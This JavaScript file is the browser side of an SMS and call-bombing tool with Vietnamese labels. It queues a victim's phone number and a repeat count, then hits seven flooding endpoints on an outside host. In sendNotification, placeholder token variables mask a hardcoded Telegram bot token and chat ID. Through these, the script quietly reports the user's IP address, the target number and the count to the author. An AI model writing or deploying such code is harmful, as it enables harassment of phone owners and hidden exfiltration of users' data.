let queue = [];
let processing = false;

// Bản quyền của quang
const urls = [
    'https://quang.nqtool.net/?',
    'https://quang.nqtool.net/index1.php?',
    'https://quang.nqtool.net/index2.php?',
    'https://quang.nqtool.net/index3.php?',
    'https://quang.nqtool.net/index4.php?',
    'https://quang.nqtool.net/index5.php?',
    'https://quang.nqtool.net/index6.php?'
];

function addToQueue() {
    const phone = document.getElementById('phone').value;
    const times = document.getElementById('times').value;

    if (phone && times) {
        queue.push({ phone, times });
        updateStatusBar();
        if (!processing) {
            processQueue();
        }
    }
}

function processQueue() {
    if (queue.length === 0) {
        processing = false;
        return;
    }

    processing = true;
    const { phone, times } = queue.shift();

    const listItem = document.createElement('li');
    listItem.innerText = `Bắt Đầu ${phone} (${times} times)`;
    document.getElementById('status-list').appendChild(listItem);

    // Fetch IP address before proceeding with the spam
    fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            
            // Send "Đang xử lý" notification
            sendNotification(ip, phone, times, 'Đang xử lý', '');

            spamSmsAndCall(phone, times, ip, listItem);
        })
        .catch(error => {
            console.error('Error fetching IP:', error);
            spamSmsAndCall(phone, times, 'Unknown IP', listItem); // Fallback if IP fetch fails
        });
}

function spamSmsAndCall(phone, times, ip, listItem) {
    // Create URLs for API requests
    const urlsToFetch = urls.map(url => `${url}phone=${phone}&amout=${times}`);

    Promise.all(urlsToFetch.map((url, index) => 
        fetch(url)
            .then(response => response.text()) // Change to text() to handle plain text responses
            .then(responseText => {
                // Extract endpoint (e.g., 'index1.php')
                const endpoint = new URL(url).pathname.split('/').pop();
                // Check if the response contains the word "sent"
                const isSuccess = responseText.includes('sent');

                return { endpoint, isSuccess, message: `URL${index + 1} - ${isSuccess ? 'Thành công' : 'Thất bại'}` };
            })
            .catch(error => {
                console.error('Error:', error);
                return { endpoint: 'unknown', isSuccess: false, message: `URL${index + 1} - Thất bại` };
            })
    ))
    .then(results => {
        const messages = results.map(result => result.message).join(', ');
        const endpoint = results[0]?.endpoint || 'unknown';

        listItem.innerText = `Thành Công ${phone}: ${messages}`;

        // Send "Xử lý thành công" notification
        sendNotification(ip, phone, times, 'Xử lý thành công', endpoint);

        processQueue();
    })
    .catch(error => {
        listItem.innerText = `Thất bại ${phone}`;
        processQueue();
    });
}

function sendNotification(ip, phone, times, status, endpoint) {
    const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';  // Replace with your bot's token
    const chatId = 'YOUR_CHAT_ID';  // Replace with your chat ID or group's chat ID

    // Construct the message based on the status
    let message;
    if (status === 'Đang xử lý') {
        message = `Trạng thái: ${status}\n- IP: ${ip}\n- Phone: ${phone}\n- Times: ${times}`;
    } else if (status === 'Xử lý thành công') {
        message = `Trạng thái: ${status}\n- IP: ${ip}\n- Phone: ${phone}\n- Times: ${times}\n- Endpoint: ${endpoint}`;
    }

    const url = `https://api.telegram.org/bot7078009829:AAFvbF1hGtzdeLM8egbrmJDK0kpePgBPwOQ/sendMessage?chat_id=-1002136414572&text=${encodeURIComponent(message)}`;

    // Send the notification to Telegram
    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log(`Notification (${status}) sent to Telegram successfully.`);
            } else {
                console.error('Failed to send notification:', data);
            }
        })
        .catch(error => {
            console.error('Error sending notification:', error);
        });
}

function updateStatusBar() {
    const statusList = document.getElementById('status-list');
    statusList.innerHTML = ''; // Clear the list
    queue.forEach((item, index) => {
        const listItem = document.createElement('li');
        listItem.innerText = `Luồng: ${item.phone} (${item.times} times)`;
        statusList.appendChild(listItem);
    });
}
